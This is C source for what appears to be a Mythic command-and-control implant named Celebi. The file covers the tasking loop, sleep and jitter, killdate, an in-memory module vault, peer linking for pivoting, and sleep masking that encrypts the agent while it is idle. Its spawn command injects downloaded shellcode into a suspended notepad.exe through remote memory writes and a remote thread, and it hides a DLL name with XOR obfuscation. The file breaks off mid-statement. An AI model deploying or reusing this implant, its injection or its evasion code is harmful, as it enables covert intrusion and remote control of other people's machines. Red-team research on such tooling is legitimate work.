#include <winsock2.h>
#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char ENC_PARAMS[4096] __attribute__((section(".text")));
char ENC_KEY[128]      __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
WINBASEAPI VOID WINAPI KERNEL32$ExitThread(DWORD dwExitCode);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
WINBASEAPI char *MSVCRT$strtok(char *strToken, const char *strDelimit);
WINBASEAPI int MSVCRT$atoi(const char *str);

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

WINBASEAPI VOID WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME lpSystemTime);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(void);

/* port availability check (spawn) */
WINBASEAPI int WINAPI WS2_32$WSAStartup(WORD wVersionRequested, void *lpWSAData);
WINBASEAPI SOCKET WINAPI WS2_32$socket(int af, int type, int protocol);
WINBASEAPI int WINAPI WS2_32$bind(SOCKET s, const struct sockaddr *name, int namelen);
WINBASEAPI int WINAPI WS2_32$closesocket(SOCKET s);
WINBASEAPI unsigned short WINAPI WS2_32$htons(unsigned short hostshort);

/* spawn: process creation + injection */
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine,
	LPVOID lpProcessAttributes, LPVOID lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
	LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, void *lpStartupInfo, void *lpProcessInformation);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, const void *lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPVOID lpThreadAttributes, SIZE_T dwStackSize,
	void *lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, void *lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE hThread);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

/*
 *
 * RANDOMNESS, JITTER & KILLDATE
 *
*/

unsigned int crypto_rng_state __attribute__((section(".text"))) = 0;

void crypto_random_bytes(unsigned char *buf, size_t len) {
	// xorshift32 seeded from the system tick count. Good enough for IVs/jitter.
	// The state lives in .text (patched at link time); access it only via its
	// address so the linker can transform the references.
	unsigned int *state = &crypto_rng_state;
	for (size_t i = 0; i < len; i++) {
		if (*state == 0) {
			*state = KERNEL32$GetTickCount() ^ 0x9e3779b9u;
		}
		*state ^= *state << 13;
		*state ^= *state >> 17;
		*state ^= *state << 5;
		buf[i] = (unsigned char)(*state >> 24);
	}
}

int apply_jitter(int base, int pct) {
	// Randomized sleep: base +/- pct% (percent of base).
	if (pct <= 0 || base <= 0) {
		return base;
	}
	int range = (base * pct) / 100;
	if (range < 1) {
		range = 1;
	}
	unsigned int r = 0;
	crypto_random_bytes((unsigned char *)&r, sizeof(r));
	int delta = (int)(r % (unsigned int)(range * 2 + 1)) - range;
	int result = base + delta;
	return result > 0 ? result : 1;
}

static int parse_ymd(const char *s, int *y, int *m, int *d) {
	// Parse "YYYY-MM-DD".
	if (MSVCRT$strlen(s) < 10) {
		return 0;
	}
	*y = (s[0]-'0')*1000 + (s[1]-'0')*100 + (s[2]-'0')*10 + (s[3]-'0');
	*m = (s[5]-'0')*10 + (s[6]-'0');
	*d = (s[8]-'0')*10 + (s[9]-'0');
	return 1;
}

static BOOL killdate_expired(const char *killdate) {
	// Returns TRUE once the current date is at or past the killdate.
	if (killdate == NULL || killdate[0] == '\0') {
		return FALSE;
	}
	int ky, km, kd;
	if (!parse_ymd(killdate, &ky, &km, &kd)) {
		return FALSE;
	}
	SYSTEMTIME st;
	KERNEL32$GetSystemTime(&st);
	long cur = (long)st.wYear * 10000L + (long)st.wMonth * 100 + (long)st.wDay;
	long kdl = (long)ky * 10000L + (long)km * 100 + (long)kd;
	return cur >= kdl;
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
	TaskPostReply reply = { 0 };
	BOOL result;
	
	size_t out_len = MSVCRT$strlen(output);
	
	// If the message is short, just send it (this response completes the task).
	if (out_len <= MAXIMUM_POST_SIZE) {
		result = perform_post(state, task, &reply, output, success, TRUE);
		
		#ifdef CELEBI_DEBUG
		if (result == TRUE && reply.success == 1) {
			dprintf("Server acknowledged posted command output.");
		}
		#endif
		
		return;
	}
	
	// Otherwise, break it up into chunks. Only the final chunk completes the task.
	for (int i = 0; i < out_len; i += MAXIMUM_POST_SIZE) {
		int next_len = i + MAXIMUM_POST_SIZE < out_len ? MAXIMUM_POST_SIZE : (out_len - i);
		BOOL completed = (i + MAXIMUM_POST_SIZE >= out_len);
		char *next = KERNEL32$VirtualAlloc(0, next_len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int j = 0; j < next_len; j++) {
			next[j] = output[i+j];
		}
		next[next_len] = '\0';
		result = perform_post(state, task, &reply, next, success, completed);
		KERNEL32$VirtualFree(next, 0, MEM_RELEASE);
		
		#ifdef CELEBI_DEBUG
		if (result == TRUE && reply.success == 1) {
			dprintf("Server acknowledged posted command output.");
		}
		#endif
	}
}

void agent_sleep(AgentState *state, TaskInfo *task) {
	int interval = MSVCRT$atoi(task->parameters);
	state->sleep_time = interval;
	
	#ifdef CELEBI_DEBUG
	dprintf("Changed sleep interval to: %i", state->sleep_time);
	#endif
	
	agent_post(state, task, "", STR(STATUS_SUCCESS));
}

void agent_exit(AgentState *state, TaskInfo *task) {
	if (task != NULL) {
		agent_post(state, task, "", STR(STATUS_SUCCESS));
	}

	HttpDestroy(state->http);
	free_params(&state->params);
	free_vault(&state->file_vault);
	if (state->spawnto != NULL) { KERNEL32$VirtualFree(state->spawnto, 0, MEM_RELEASE); }
	
	#ifdef CELEBI_EXIT_THREAD
	KERNEL32$ExitThread(0);
	#else
	KERNEL32$ExitProcess(0);
	#endif
}

void agent_whoami(AgentState *state, TaskInfo *task) {
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.whoami);
	
	if (result == FALSE) {
		#ifdef CELEBI_DEBUG
		dprintf("Failed to resolve '%s' PICO", state->builtin_picos.whoami);
		#endif
		
		agent_post(state, task, "", STR(STATUS_CANNOT_RESOLVE_PICO));
		return;
	}
	
	WHOAMI_PICO entrypoint = (WHOAMI_PICO) pico.entrypoint;
	char *whoami_output = entrypoint();
	
	if (whoami_output != NULL) {
		agent_post(state, task, whoami_output, STR(STATUS_SUCCESS));
		KERNEL32$VirtualFree(whoami_output, 0, MEM_RELEASE);
	} else {
		agent_post(state, task, "", STR(STATUS_COMMAND_FAILED));
	}
	
	free_resolved_pico(&pico);
}

/* Download a file from Mythic into a fresh buffer (the register/spawn flow).
 * On success, out_buf and out_len are set and the caller owns out_buf. */
static int agent_download_file(AgentState *state, char *task_id, char *file_uuid, char **buf, size_t *buflen) {
	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task_id, file_uuid);
	
	// Guard against the server failing to advance the chunk counter (no-progress loop).
	int no_progress_count = 0;
	int last_next_chunk = 0;
	while (upload.finished == FALSE) {
		BOOL result = perform_upload(state, &upload);
		if (result == FALSE) {
			upload.error = TRUE;
			break;
		}
		if (upload.next_chunk == last_next_chunk) {
			no_progress_count++;
			if (no_progress_count >= 3) {
				upload.error = TRUE;
				break;
			}
		} else {
			no_progress_count = 0;
			last_next_chunk = upload.next_chunk;
		}
	}
	
	if (upload.error == TRUE) {
		free_upload_manager(&upload);
		return -1;
	}
	*buf = upload.current_buffer;
	*buflen = upload.buflen;
	upload.current_buffer = NULL; /* hand ownership to the caller */
	free_upload_manager(&upload);
	return 0;
}

void agent_register(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "", STR(STATUS_MISSING_FILENAME));
		return;
	}

	char *name = MSVCRT$strtok(task->parameters, "\t");
	char *uuid = MSVCRT$strtok(NULL, "\t");
	
	if (is_in_vault(&state->file_vault, name) == TRUE) {
		agent_post(state, task, "", STR(STATUS_DUPLICATE_FILENAME));
		return;
	}

	char *buf = NULL;
	size_t buflen = 0;
	if (agent_download_file(state, task->id, uuid, &buf, &buflen) != 0) {
		agent_post(state, task, "", STR(STATUS_UPLOAD_FAILED));
		return;
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("Retrieved a file from server, final size: %u", buflen);
	#endif

	if (add_to_vault(&state->file_vault, name, buf, buflen) == TRUE) {
		agent_post(state, task, name, STR(STATUS_SUCCESS));
	} else {
		agent_post(state, task, "", STR(STATUS_VAULT_FULL));
	}
	
	KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}

/* Tiny decimal formatter (no sprintf import needed in the PIC). */
static void agent_itoa(unsigned long v, char *out) {
	char tmp[16];
	int i = 0;
	if (v == 0) { tmp[i++] = '0'; }
	while (v > 0) {
		tmp[i++] = (char)('0' + (v % 10));
		v /= 10;
	}
	int j = 0;
	while (i > 0) {
		out[j++] = tmp[--i];
	}
	out[j] = '\0';
}

/* Returns non-zero when nothing is listening on the given TCP port. The check
 * runs on this (the spawning) machine — the child will bind on the same host. */
static int agent_port_in_use(int port) {
	/* "ws2_32.dll" ^ 0x4A — load it without a plaintext name. */
	static const unsigned char WS2_32_XOR[] = {0x3d, 0x39, 0x78, 0x15, 0x79, 0x78, 0x64, 0x2e, 0x26, 0x26};
	load_module_xor(WS2_32_XOR, sizeof(WS2_32_XOR), 0x4A);
	WSADATA wsa;
	if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		return 1; /* can't tell — assume busy */
	}
	SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET) {
		return 1;
	}
	struct sockaddr_in addr;
	ZeroMemoryStruct(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = WS2_32$htons((unsigned short)port);
	int busy = (WS2_32$bind(s, (const struct sockaddr *)&addr, sizeof(addr)) != 0);
	WS2_32$closesocket(s);
	return busy;
}

void agent_spawn(AgentState *state, TaskInfo *task) {
	// Parameters: <file_uuid>	<port>  (port = 0 for non-tcp payloads).
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "missing file", STR(STATUS_MISSING_COMMAND));
		return;
	}
	char *file = task->parameters;
	char *port_str = NULL;
	{
		char *p = task->parameters;
		while (*p != '\0') {
			if (*p == '\t') {
				*p = '\0';
				port_str = p + 1;
				break;
			}
			p++;
		}
	}
	int port = (port_str != NULL) ? MSVCRT$atoi(port_str) : 0;

	/* Fail fast: make sure the randomly chosen port is actually free before
	 * downloading and injecting a child that would die on bind. */
	if (port > 0 && agent_port_in_use(port)) {
		agent_post(state, task, "port in use", STR(STATUS_COMMAND_FAILED));
		return;
	}

	char *buf = NULL;
	size_t buflen = 0;
	if (agent_download_file(state, task->id, file, &buf, &buflen) != 0) {
		agent_post(state, task, "failed to download payload", STR(STATUS_UPLOAD_FAILED));
		return;
	}

	// Create the sacrificial process suspended and inject the shellcode.
	const char *path = (state->spawnto != NULL && state->spawnto[0] != '\0')
		? state->spawnto : "C:\\Windows\\System32\\notepad.exe";
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	if (!KERNEL32$CreateProcessA(NULL, (LPSTR)path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		agent_post(state, task, "failed to create process", STR(STATUS_COMMAND_FAILED));
		return;
	}

	LPVOID remote = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, buflen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remote == NULL) {
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		agent_post(state, task, "failed to allocate remote memory", STR(STATUS_COMMAND_FAILED));
		return;
	}

	SIZE_T written = 0;
	if (!KERNEL32$WriteProcessMemory(pi.hProcess, remote, buf, buflen, &written)) {
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		agent_post(state, task, "failed to write remote memory", STR(STATUS_COMMAND_FAILED));
		return;
	}

	HANDLE thread = KERNEL32$CreateRemoteThread(pi.hProcess, NULL, 0, (void *)remote, NULL, 0, NULL);
	if (thread == NULL) {
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		agent_post(state, task, "failed to create remote thread", STR(STATUS_COMMAND_FAILED));
		return;
	}
	/* Deliberately do NOT resume the spawnto's main thread: the sacrificial
	 * process's own entry point would run and typically exit (e.g. dllhost),
	 * taking the injected agent thread down with it. The remote thread is
	 * already schedulable, so the agent runs while the process stays alive. */

	KERNEL32$CloseHandle(thread);
	KERNEL32$CloseHandle(pi.hThread);
	KERNEL32$CloseHandle(pi.hProcess);
	KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);

	char out[64];
	agent_itoa((unsigned long)pi.dwProcessId, out);
	agent_post(state, task, out, STR(STATUS_SUCCESS));
}

void agent_spawnto(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "missing path", STR(STATUS_MISSING_COMMAND));
		return;
	}
	if (state->spawnto != NULL) {
		KERNEL32$VirtualFree(state->spawnto, 0, MEM_RELEASE);
	}
	state->spawnto = clone_str(task->parameters);
	agent_post(state, task, "spawnto set", STR(STATUS_SUCCESS));
}

void agent_unregister(AgentState *state, TaskInfo *task) {
	char *name = task->parameters;
	
	BOOL result = remove_from_vault(&state->file_vault, name);
	
	#ifdef CELEBI_DEBUG
	if (result == FALSE) {
		dprintf("Failed to remove '%s' from vault", name);
	} else {
		dprintf("Successfully removed '%s' from vault", name);
	}
	#endif
	
	if (result == TRUE) {
		agent_post(state, task, "", STR(STATUS_SUCCESS)); 
	} else {
		agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
	}
}

void agent_execute_pico(AgentState *state, TaskInfo *task) {
	char *name = MSVCRT$strtok(task->parameters, "\t");
	char *args = MSVCRT$strtok(NULL, "\t");
	
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, name);
	
	if (result == FALSE) {
		#ifdef CELEBI_DEBUG
		dprintf("Failed to resolve '%s' PICO", name);
		#endif
		
		agent_post(state, task, "", STR(STATUS_CANNOT_RESOLVE_PICO));
		return;
	}
	
	GENERIC_PICO entrypoint = (GENERIC_PICO) pico.entrypoint;
	char *pico_output;
	if (args == NULL) {
		pico_output = entrypoint(NULL, 0);
	} else {
		pico_output = entrypoint(args, MSVCRT$strlen(args));
	}
	
	if (pico_output != NULL) {
		agent_post(state, task, pico_output, STR(STATUS_SUCCESS));
	} else {
		agent_post(state, task, "", STR(STATUS_SUCCESS));
	}
	
	free_resolved_pico(&pico);
}

void agent_morph(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "", STR(STATUS_MISSING_COMMAND));
		return;
	}

	char *cmd = MSVCRT$strtok(task->parameters, "\t");
	char *pico = MSVCRT$strtok(NULL, "\t");
	
	if (is_in_vault(&state->file_vault, pico) == FALSE) {
		agent_post(state, task, "", STR(STATUS_UNKNOWN_PICO));
		return;
	}
	
	if (MSVCRT$strcmp(cmd, "whoami") == 0) {
		if (remove_from_vault(&state->file_vault, state->builtin_picos.whoami) == FALSE) {
			agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
			return;
		}
		
		state->builtin_picos.whoami = clone_str(pico);
		agent_post(state, task, "", STR(STATUS_SUCCESS));
		return;
	}
	
	agent_post(state, task, "", STR(STATUS_UNKNOWN_COMMAND));
}

void agent_queue_edge(AgentState *state, char *source, char *destination, char *action, char *c2_profile) {
	// Append one pending callback-graph edge update; flushed with the next get_tasking.
	if (state->pending_edge_count >= state->pending_edge_cap) {
		int new_cap = state->pending_edge_cap == 0 ? 4 : state->pending_edge_cap * 2;
		PendingEdge *new_edges = KERNEL32$VirtualAlloc(0, sizeof(PendingEdge) * new_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < state->pending_edge_count; i++) {
			new_edges[i] = state->pending_edges[i];
		}
		if (state->pending_edges != NULL) {
			KERNEL32$VirtualFree(state->pending_edges, 0, MEM_RELEASE);
		}
		state->pending_edges = new_edges;
		state->pending_edge_cap = new_cap;
	}
	state->pending_edges[state->pending_edge_count].source = clone_str(source);
	state->pending_edges[state->pending_edge_count].destination = clone_str(destination);
	state->pending_edges[state->pending_edge_count].action = clone_str(action);
	state->pending_edges[state->pending_edge_count].c2_profile = clone_str(c2_profile);
	state->pending_edge_count++;
}

void agent_link(AgentState *state, TaskInfo *task) {
	// Parameters: c2_profile\thost\tpipename\tport  (tab-joined by the translator).
	// NOTE: fields may be empty (tcp links have no pipename), and strtok skips
	// consecutive delimiters — parse the fields manually to keep positions.
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "missing c2_profile, host and profile parameters", STR(STATUS_MISSING_COMMAND));
		return;
	}
	if (state->link_count >= 32) {
		agent_post(state, task, "too many links (max 32)", STR(STATUS_COMMAND_FAILED));
		return;
	}

	char *profile = task->parameters;
	char *host = NULL;
	char *pipename = NULL;
	char *port_str = NULL;
	{
		char *p = task->parameters;
		int field = 0;
		while (*p != '\0') {
			if (*p == '\t') {
				*p = '\0';
				field++;
				if (field == 1) { host = p + 1; }
				else if (field == 2) { pipename = p + 1; }
				else if (field == 3) { port_str = p + 1; break; }
			}
			p++;
		}
	}
	if (host == NULL || host[0] == '\0') {
		agent_post(state, task, "missing host", STR(STATUS_MISSING_COMMAND));
		return;
	}
	int port = (port_str != NULL) ? MSVCRT$atoi(port_str) : 0;
	if (MSVCRT$strcmp(profile, "tcp") == 0 && port <= 0) {
		agent_post(state, task, "missing tcp port", STR(STATUS_MISSING_COMMAND));
		return;
	}

	P2P_PEER *peer = (P2P_PEER *)KERNEL32$VirtualAlloc(0, sizeof(P2P_PEER), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (peer == NULL || p2p_client_connect(peer, host, profile, pipename, port) != 0) {
		agent_post(state, task, "failed to connect to peer", STR(STATUS_COMMAND_FAILED));
		if (peer != NULL) { KERNEL32$VirtualFree(peer, 0, MEM_RELEASE); }
		return;
	}

	peer->profile = clone_str(profile);
	p2p_gen_uuid(peer->local_uuid = (char *)KERNEL32$VirtualAlloc(0, 37, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE));

	/* append to the link list (any agent can hold many links for pivoting) */
	if (state->link_count >= state->link_cap) {
		int new_cap = state->link_cap == 0 ? 4 : state->link_cap * 2;
		P2P_PEER **new_links = (P2P_PEER **)KERNEL32$VirtualAlloc(0, sizeof(P2P_PEER *) * new_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < state->link_count; i++) {
			new_links[i] = state->links[i];
		}
		if (state->links != NULL) {
			KERNEL32$VirtualFree(state->links, 0, MEM_RELEASE);
		}
		state->links = new_links;
		state->link_cap = new_cap;
	}
	state->links[state->link_count++] = peer;

	agent_post(state, task, "linked", STR(STATUS_SUCCESS));
}

void agent_unlink(AgentState *state, TaskInfo *task) {
	// Parameters: c2_profile\thost\tpipename\tport. Empty params (or no match)
	// unlink the most recent peer.
	char *profile = MSVCRT$strtok(task->parameters, "\t");
	char *host = MSVCRT$strtok(NULL, "\t");

	int found = -1;
	if (profile == NULL || profile[0] == '\0') {
		for (int i = state->link_count - 1; i >= 0; i--) {
			if (state->links[i] != NULL && state->links[i]->active) {
				found = i;
				break;
			}
		}
	} else {
		for (int i = 0; i < state->link_count; i++) {
			P2P_PEER *p = state->links[i];
			if (p == NULL || !p->active) {
				continue;
			}
			if (MSVCRT$strcmp(profile, p->profile) != 0) {
				continue;
			}
			if (host != NULL && (p->host == NULL || MSVCRT$strcmp(host, p->host) != 0)) {
				continue;
			}
			found = i;
			break;
		}
	}
	if (found < 0) {
		agent_post(state, task, "no matching peer", STR(STATUS_COMMAND_FAILED));
		return;
	}

	// Report the edge removal so Mythic updates the callback graph.
	P2P_PEER *p = state->links[found];
	const char *dest = (p->mythic_uuid != NULL) ? p->mythic_uuid : p->local_uuid;
	const char *c2profile = (p->profile != NULL) ? p->profile : "smb";
	agent_queue_edge(state, state->params.callback_uuid, (char *)dest, "remove", (char *)c2profile);

	p2p_close(p);
	KERNEL32$VirtualFree(p, 0, MEM_RELEASE);
	for (int i = found; i < state->link_count - 1; i++) {
		state->links[i] = state->links[i + 1];
	}
	state->link_count--;

	agent_post(state, task, "unlinked", STR(STATUS_SUCCESS));
}

void agent_p2p_drain(AgentState *state) {
	// Pull any complete frames from every linked child into its in_queue.
	for (int i = 0; i < state->link_count; i++) {
		P2P_PEER *p = state->links[i];
		if (p == NULL || !p->active) {
			continue;
		}
		char *msg = NULL;
		while ((msg = p2p_poll(p)) != NULL) {
			peer_queue_in(p, msg);
		}
	}
}

static P2P_PEER *agent_p2p_find_peer(AgentState *state, const char *uuid) {
	// Delegate responses echo the label we used when relaying the child's
	// message; match that against each link's current label.
	if (uuid == NULL || uuid[0] == '\0') {
		return NULL;
	}
	for (int i = 0; i < state->link_count; i++) {
		P2P_PEER *p = state->links[i];
		if (p == NULL || !p->active) {
			continue;
		}
		const char *label = (p->mythic_uuid != NULL) ? p->mythic_uuid : p->local_uuid;
		if (label != NULL && MSVCRT$strcmp(label, uuid) == 0) {
			return p;
		}
	}
	return NULL;
}

void agent_p2p_relay_responses(AgentState *state, TaskingReply *reply) {
	// Route Mythic's delegate responses back to the right linked child and
	// adopt any new_uuid Mythic assigned to it.
	for (int i = 0; i < reply->delegate_count; i++) {
		P2P_PEER *p = agent_p2p_find_peer(state, reply->delegate_uuids[i]);
		if (p == NULL) {
			continue;
		}
		p2p_queue_out(p, clone_str(reply->delegate_msgs[i]));
		if (reply->delegate_new_uuids[i] != NULL && reply->delegate_new_uuids[i][0] != '\0') {
			if (p->mythic_uuid != NULL) {
				KERNEL32$VirtualFree(p->mythic_uuid, 0, MEM_RELEASE);
			}
			p->mythic_uuid = clone_str(reply->delegate_new_uuids[i]);
		}
		p2p_flush(p);
	}
}

void process_task(TaskInfo *task, AgentState *state) {
	if (MSVCRT$strcmp(task->command, "exit") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received exit command.");
		#endif
		
		agent_exit(state, task);
		return;
	}

	if (MSVCRT$strcmp(task->command, "sleep") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received sleep command with parameters: '%s'", task->parameters);
		#endif
		
		agent_sleep(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "whoami") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received whoami command.");
		#endif
		
		agent_whoami(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "register") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received register command with parameters: '%s'", task->parameters);
		#endif
		
		agent_register(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "unregister") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received unregister command with parameters: '%s'", task->parameters);
		#endif
		
		agent_unregister(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "execute_pico") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received execute_pico command with parameters: '%s'", task->parameters);
		#endif
		
		agent_execute_pico(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "morph") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received morph command with parameters: '%s'", task->parameters);
		#endif
		
		agent_morph(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "link") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received link command with parameters: '%s'", task->parameters);
		#endif
		
		agent_link(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "unlink") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received unlink command with parameters: '%s'", task->parameters);
		#endif
		
		agent_unlink(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "spawn") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received spawn command with parameters: '%s'", task->parameters);
		#endif
		
		agent_spawn(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "spawnto") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received spawnto command with parameters: '%s'", task->parameters);
		#endif
		
		agent_spawnto(state, task);
		return;
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
	#endif
}

void sleep_mask(AgentState *state) {
	// Resolve built-in PICOs used for masking.
	ResolvedPico mask_vault = { 0 };
	ResolvedPico mask_sleep = { 0 };
	
	// If we can't resolve the required PICOs, gracefully crash.
	if (resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_vault, state->builtin_picos.mask_vault) == FALSE) { agent_exit(state, NULL); }
	if (resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_sleep, state->builtin_picos.mask_sleep) == FALSE) { agent_exit(state, NULL); }
	
	MASK_VAULT_PICO mask_vault_entrypoint = (MASK_VAULT_PICO) mask_vault.entrypoint;
	MASK_SLEEP_PICO mask_sleep_entrypoint = (MASK_SLEEP_PICO) mask_sleep.entrypoint;

	// Apply jitter to the effective sleep for this iteration.
	int effective_sleep = apply_jitter(state->sleep_time, state->params.callback_jitter);

	// Mask vault.
	if (effective_sleep >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }

	// Mask agent and sleep...
	mask_sleep_entrypoint(NULL, effective_sleep, ENC_KEY, ENC_KEY_LEN);
	
	// Unmask vault.
	if (effective_sleep >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
	
	// Free resolved PICOs.
	free_resolved_pico(&mask_vault);
	free_resolved_pico(&mask_sleep);
}

void go() {
	AgentState state = { 0 };
	state.sleep_time = DEFAULT_SLEEP_TIME;
	state.spawnto = clone_str("C:\\Windows\\System32\\notepad.exe");
	
	unpack_params(ENC_PARAMS, ENC_KEY, ENC_KEY_LEN, &state.params);
	
	// Restore real CRLF in the header string (escaped at build time for config.spec).
	if (state.params.headers != NULL && state.params.headers[0] != '\0') {
		char *unescaped = agent_unescape_crlf(state.params.headers);
		KERNEL32$VirtualFree(state.params.headers, 0, MEM_RELEASE);
		state.params.headers = unescaped;
	}
	
	// Honor the C2 profile's callback interval.
	if (state.params.callback_interval > 0) {
		state.sleep_time = state.params.callback_interval;
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("Parameters unpacked. Sleep interval: %d, jitter: %d%%", state.sleep_time, state.params.callback_jitter);
	#endif
	
	// Honor the C2 profile's killdate.
	if (killdate_expired(state.params.killdate)) {
		#ifdef CELEBI_DEBUG
		dprintf("Killdate reached, exiting.");
		#endif
		free_params(&state.params);
		return;
	}
	
	state.file_vault = new_vault();
	
	#ifdef CELEBI_DEBUG
	dprintf("Vault allocated.");
	#endif
	
	state.funcs = resolve_pico_functions();

	#ifdef CELEBI_DEBUG
	dprintf("Resolved PICO loading functions.");
	#endif
	
	state.builtin_picos = load_builtin_picos(&state.file_vault, ENC_KEY, ENC_KEY_LEN);
	
	#ifdef CELEBI_DEBUG
	dprintf("Loaded PICO capabilities.");
	#endif
	
	// Enable AES256-HMAC when the payload was built with AESPSK=aes256_hmac.
	if (state.params.aes_value != NULL && MSVCRT$strcmp(state.params.aes_value, "aes256_hmac") == 0
